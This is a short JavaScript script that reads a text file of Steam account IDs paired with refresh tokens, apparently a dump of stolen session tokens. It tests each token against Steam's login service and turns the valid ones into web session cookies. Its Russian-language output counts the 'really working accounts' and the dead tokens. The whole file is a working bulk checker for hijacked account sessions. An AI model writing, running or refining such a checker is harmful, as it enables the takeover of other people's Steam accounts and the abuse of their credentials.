import { LoginSession, EAuthTokenPlatformType } from 'steam-session';
import fs from 'fs';

const steamTxtPath = 'C:\\Users\\iliyk\\Desktop\\steam.txt';
const steamTxt = fs.readFileSync(steamTxtPath, 'utf8');
const allTokens = [...new Set(steamTxt.match(/7656119\d+----ey[A-Za-z0-9_\-.]+/g) || [])];

console.log(`Testing real Steam LoginSession for ${allTokens.length} tokens...\n`);

async function testTokenWithSteamSession(tokenStr, i) {
  const [steamid, refreshToken] = tokenStr.split('----');
  
  const session = new LoginSession(EAuthTokenPlatformType.SteamClient);
  session.refreshToken = refreshToken;

  try {
    // Attempt to renew or get web cookies from refresh token
    const webCookies = await session.getWebCookies();
    if (webCookies && webCookies.length > 0) {
      console.log(`✅ [#${i+1}] ${steamid}: LOGIN SUCCESSFUL! Web cookies generated (${webCookies.length} cookies)`);
      return { steamid, isValid: true, cookies: webCookies };
    } else {
      console.log(`❌ [#${i+1}] ${steamid}: No web cookies returned`);
      return { steamid, isValid: false, error: 'No cookies' };
    }
  } catch (err) {
    console.log(`❌ [#${i+1}] ${steamid}: Login failed -> ${err.message}`);
    return { steamid, isValid: false, error: err.message };
  }
}

async function runSessionAudit() {
  const results = [];
  for (let i = 0; i < allTokens.length; i++) {
    const res = await testTokenWithSteamSession(allTokens[i], i);
    results.push(res);
    await new Promise(r => setTimeout(r, 500));
  }

  const valid = results.filter(r => r.isValid);
  const dead = results.filter(r => !r.isValid);

  console.log(`\n==============================================`);
  console.log(`🟢 РЕАЛЬНО РАБОЧИХ АККАУНТОВ (ВХОД В STEAM РАБОТАЕТ): ${valid.length}`);
  console.log(`🔴 МЕРТВЫХ ТОКЕНОВ (СБРОШЕНЫ/ОШИБКА):                 ${dead.length}`);
  console.log(`==============================================\n`);
}

runSessionAudit();
